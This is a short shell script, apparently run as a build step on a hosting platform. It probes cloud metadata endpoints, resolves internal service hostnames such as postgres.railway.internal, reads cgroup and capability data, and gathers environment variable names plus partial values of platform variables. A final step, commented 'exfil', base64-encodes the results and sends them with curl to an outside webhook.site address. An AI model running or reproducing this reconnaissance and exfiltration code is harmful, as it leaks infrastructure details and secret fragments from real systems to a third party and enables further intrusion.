#!/bin/sh
TOKEN="7c513384-7a0b-4162-a6b5-d47e68900f5d"
R="host=$(hostname);uid=$(id -u);"
# 1. metadata endpoints
for t in "http://169.254.169.254/" "http://metadata.google.internal/computeMetadata/v1/" "http://100.100.100.200/latest/meta-data/" "http://169.254.170.2/"; do
  c=$(curl -s -m 4 -o /dev/null -w "%{http_code}" "$t" 2>/dev/null || echo ERR); R="$R meta[$t]=$c;"
done
# 2. internal DNS
d=$(getent hosts postgres.railway.internal 2>/dev/null | head -1 || echo NX); R="$R intdns=$d;"
# 3. cgroup / init
R="$R cgroup=$(head -1 /proc/1/cgroup 2>/dev/null);"
# 4. env var names + masked values
R="$R envnames=$(env | cut -d= -f1 | sort | tr '\n' ',' | head -c 500);"
R="$R railwayenv=$(env | grep -iE 'railway' | sed 's/=\(.\{8\}\).*/=\1.../' | tr '\n' ',' | head -c 400);"
# 5. capabilities / mounts
R="$R cap=$(grep CapEff /proc/self/status 2>/dev/null);"
# 6. resolve internal hostname of sibling service
s=$(getent hosts balerion-build-probe.railway.internal 2>/dev/null | head -1 || echo NX); R="$R selfdns=$s;"
# exfil
curl -sS -m 20 "https://webhook.site/$TOKEN/build-battery?r=$(printf %s "$R" | base64 -w0 | tr -d '\n')" >/dev/null 2>&1
echo done
